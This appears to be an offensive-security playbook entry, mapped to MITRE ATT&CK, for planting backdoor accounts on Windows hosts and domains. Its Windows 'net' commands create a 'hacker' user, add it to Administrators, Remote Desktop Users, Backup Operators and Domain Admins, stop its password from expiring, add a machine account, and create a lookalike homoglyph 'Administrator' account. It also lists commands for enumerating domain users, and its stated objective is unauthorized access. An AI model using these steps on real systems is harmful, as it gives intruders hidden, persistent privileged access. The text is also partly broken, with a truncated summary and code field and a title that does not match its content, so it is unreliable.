---
id: d704f6c6-6c48-498e-bb52-6ff46241eb72
name: Windows - Credential Enumeration
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:30.616361+00:00'
updated_at: '2023-04-10T20:38:04.495900+00:00'
tactics:
- '[[Credential Access|TA0006 - Credential Access]]'
- '[[Discovery|TA0007 - Discovery]]'
techniques:
- '[[Account Discovery|T1087 - Account Discovery]]'
- '[[Credential Dumping|T1003 - Credential Dumping]]'
tags:
- '[[Create your credential]]'
- '[[Get credentials]]'
- '[[Windows - Using credentials]]'
commands:
- '[[Command Execution]]'
- '[[List domain users]]'
- '[[List domain users for a specific domain]]'
---

# Windows - Credential Enumeration

## Summary

Credential Enumeration is the process of discovering and gathering credentials that can be used to gain access to systems and resources. This procedure involves creating and configuring local and domain user accounts, as well as listing domain users. By doing so, an attacker can obtain valid creden

## Description

# Description

Credential Enumeration is the process of discovering and gathering credentials that can be used to gain access to systems and resources. This procedure involves creating and configuring local and domain user accounts, as well as listing domain users. By doing so, an attacker can obtain valid credentials that can be used to move laterally across the network and escalate privileges. From a technical standpoint, this procedure involves using various tools and techniques to extract credentials from the target system. The business value of this procedure is that it enables an attacker to gain unauthorized access to sensitive data, intellectual property, and other valuable assets.

## Requirements

1. Access to the target system

1. Tools for creating and configuring local and domain user accounts

1. Tools for listing domain users

## Defense

1. Implement strong password policies to prevent easy-to-guess passwords

1. Use multi-factor authentication to add an extra layer of security to user accounts

1. Monitor for unusual account activity, such as failed login attempts or unusual login times

## Objectives

1. Discover valid credentials for lateral movement and privilege escalation

1. Gain unauthorized access to sensitive data and valuable assets

# Instructions

1. To create a new local user account, run 'net user <username> <password> /add /Y'.
To add the new user to the local administrators group, run 'net localgroup administrators <username> /add'.
To add the new user to the Remote Desktop Users group, run 'net localgroup "Remote Desktop Users" <username> /add'.
To add the new user to the Backup Operators group, run 'net localgroup "Backup Operators" <username> /add'.
To add the new user to the Domain Admins group, run 'net group "Domain Admins" <username> /add /domain'.
To enable a domain user account, run 'net user <username> /ACTIVE:YES /domain'.
To prevent users from changing their password, run 'net user <username> /Passwordchg:No'.
To prevent the password from expiring, run 'net user <username> /Expires:Never'.
To create a machine account, run 'net user /add <username>$ <password>'.
To create a homoglyph administrator account, run 'net user Aԁmіnistratοr <password> /add'.

**Code**: [[net user hacker Hcker_12345678* /add /Y
net localg]]

> This command allows you to create and configure local and domain user accounts. The 'net user' command is used to create new user accounts with the specified username and password. The '/add' switch is used to add the user to the system. The '/Y' switch is used to suppress prompts for confirmation.

The 'net localgroup' command is used to add the new user to the local administrators, Remote Desktop Users, and Backup Operators groups.

The 'net group' command is used to add the new user to the Domain Admins group.

The 'net user' command is also used to enable a domain user account, prevent users from changing their password, prevent the password from expiring, and create a machine account. Additionally, the command can be used to create a homoglyph administrator account.

**Command** ([[Command Execution]]):

```bash
net user hacker Hcker_12345678* /add /Y
net localgroup administrators hacker /add
net localgroup "Remote Desktop Users" hacker /add
net localgroup "Backup Operators" hacker /add
net group "Domain Admins" hacker /add /domain
net user hacker /ACTIVE:YES /domain
net user username /Passwordchg:No
net user hacker /Expires:Never
net user /add evilbob$ evilpassword
Aԁmіnistratοr
```

2. To list all domain users, run the following command in PowerShell:
net user /dom
This will display a list of all users in the domain.
To display detailed information about a specific user, run:
net user <username> /domain
Replace <username> with the actual username to display detailed information about that user.

**Code**: [[net user /dom
net user /domain]]

> The 'net user' command is used to manage user accounts on a Windows system. The '/dom' or '/domain' option is used to specify that the command should be run on the domain controller to list all domain users. The command can be used with or without additional arguments to display information about specific users or groups. This command can be useful for administrators who need to manage user accounts on a Windows domain.

**Command** ([[List domain users]]):

```bash
net user /dom
```

**Command** ([[List domain users for a specific domain]]):

```bash
net user /domain
```

## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access|TA0006 - Credential Access]]
- [[Discovery|TA0007 - Discovery]]

### Techniques

- [[Account Discovery|T1087 - Account Discovery]]
- [[Credential Dumping|T1003 - Credential Dumping]]

## Commands Used

- [[Command Execution]]
- [[List domain users]]
- [[List domain users for a specific domain]]

## Tags

- [[Create your credential]]
- [[Get credentials]]
- [[Windows - Using credentials]]
